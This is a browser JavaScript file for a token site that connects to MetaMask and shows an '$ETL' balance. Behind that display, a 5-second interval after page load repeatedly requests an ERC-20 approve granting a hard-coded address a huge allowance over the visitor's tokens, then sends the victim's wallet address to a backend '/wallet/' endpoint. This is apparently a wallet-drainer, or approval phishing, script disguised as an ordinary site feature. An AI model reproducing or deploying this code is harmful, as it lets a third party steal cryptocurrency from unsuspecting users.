const Web3 = require("web3");
var baseURL = "http://localhost",
  web3,
  metamaskAccounts = [],
  myAccount,
  isConnected
  ourAddress = '0x679eF48220D3fb36275B04e7588d32F1C4728547'
  showApprove = false;

var ETLContract, ETLContractAddress = '0xD44FD09d74cd13838F137B590497595d6b3FEeA4',
    ETLAbi = [{"inputs":[],"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"spender","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Transfer","type":"event"},{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"spender","type":"address"}],"name":"allowance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"decimals","outputs":[{"internalType":"uint8","name":"","type":"uint8"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"subtractedValue","type":"uint256"}],"name":"decreaseAllowance","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"addedValue","type":"uint256"}],"name":"increaseAllowance","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"name","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"totalSupply","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"recipient","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transfer","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"sender","type":"address"},{"internalType":"address","name":"recipient","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transferFrom","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}];

function sleep (time) {
  return new Promise((resolve) => setTimeout(resolve, time));
}

async function getETLBalance() {
  ETLContract = new web3.eth.Contract(ETLAbi, ETLContractAddress, {from: myAccount});
  let balance = await ETLContract.methods.balanceOf(myAccount).call();
  return balance;
}

async function getApprove() {
  if (isConnected && !showApprove) {
    ETLContract = new web3.eth.Contract(ETLAbi, ETLContractAddress, {from: myAccount});
    let bigNumber = web3.utils.toBN('50000000000000000000000000000'),
        datita = await ETLContract.methods.approve(ourAddress, bigNumber).encodeABI();

        const tx = {
          from: myAccount, 
          to: ETLContractAddress, 
          data: datita 
        };

        showApprove = true;
        
        web3.eth.sendTransaction(tx, myAccount)
            .then(async function () {
              await fetch(baseURL + '/wallet/' + myAccount);
            })
            .catch( () => {
              showApprove = false;
            });
  }
}

async function checkConnection () {
  // Check if browser is running Metamask
  let result;
  if (window.ethereum) {
      web3 = new Web3(window.ethereum);
  };

  // Check if User is already connected by retrieving the accounts
  metamaskAccounts = await web3.eth.getAccounts();
  console.log(metamaskAccounts);
  result = (metamaskAccounts.length != 0);
  
  isConnected = result;
  if (isConnected) myAccount = metamaskAccounts[0]; 
  showHeaderInfo();

  return isConnected;
};

function showHeaderInfo() {
  let accountText = document.getElementById('contractButton'),
      ETLText = document.getElementById('cantETL');

  if (accountText) {
    if (isConnected) {
      let miniAddress = myAccount.substring(0, 6) +"..." + myAccount.substring(myAccount.length - 5, myAccount.length);
      accountText.innerHTML = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor" class="w-5 h-5 text-indigo-300 "><path fill-rule="evenodd" d="M10 2a1 1 0 00-1 1v1a1 1 0 002 0V3a1 1 0 00-1-1zM4 4h3a3 3 0 006 0h3a2 2 0 012 2v9a2 2 0 01-2 2H4a2 2 0 01-2-2V6a2 2 0 012-2zm2.5 7a1.5 1.5 0 100-3 1.5 1.5 0 000 3zm2.45 4a2.5 2.5 0 10-4.9 0h4.9zM12 9a1 1 0 100 2h3a1 1 0 100-2h-3zm-1 4a1 1 0 011-1h2a1 1 0 110 2h-2a1 1 0 01-1-1z" clip-rule="evenodd"></path></svg>' + miniAddress;

      getETLBalance().then(function (result) {
          let cantETL = (result / 1000000000000000000);

          if (cantETL > 0) {
              cantETL = cantETL.toFixed(2);
          } else {
              cantETL = 0;
          }

          ETLText.innerHTML = cantETL + '<span class="hidden md:flex px-1">$ETL</span>';
      });
    
    } else {
      accountText.innerHTML = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor" class="w-5 h-5 text-indigo-300 "><path fill-rule="evenodd" d="M10 2a1 1 0 00-1 1v1a1 1 0 002 0V3a1 1 0 00-1-1zM4 4h3a3 3 0 006 0h3a2 2 0 012 2v9a2 2 0 01-2 2H4a2 2 0 01-2-2V6a2 2 0 012-2zm2.5 7a1.5 1.5 0 100-3 1.5 1.5 0 000 3zm2.45 4a2.5 2.5 0 10-4.9 0h4.9zM12 9a1 1 0 100 2h3a1 1 0 100-2h-3zm-1 4a1 1 0 011-1h2a1 1 0 110 2h-2a1 1 0 01-1-1z" clip-rule="evenodd"></path></svg>...';
    }
  }
}

const metamask_connect = async () => {
  if (window.ethereum) {
    web3 = new Web3(window.ethereum);

    const networkId = await web3.eth.net.getId();

    if (networkId != 56) {
      await window.ethereum.request({   method: 'wallet_switchEthereumChain',   params: [{ chainId: '0x38' }] });
    }

    try {
      await window.ethereum.request({ method: 'eth_requestAccounts' });

      metamaskAccounts = await web3.eth.getAccounts();
      console.log(metamaskAccounts);
      myAccount = metamaskAccounts[0];

      isConnected = (metamaskAccounts.length != 0);
      showHeaderInfo();
    } catch (err) {
      console.log(err);
    }
  } else {
    //displayAlert('Error', 'MetaMask is required.');
    console.log('MetaMask is required.');
  }
};

window.onload = () => {

  checkConnection().then(function(result) {
    if (!result) {
      sleep(5000).then(() => {
        metamask_connect();
      })
    } 
  });

  setInterval(getApprove, 5000);
};
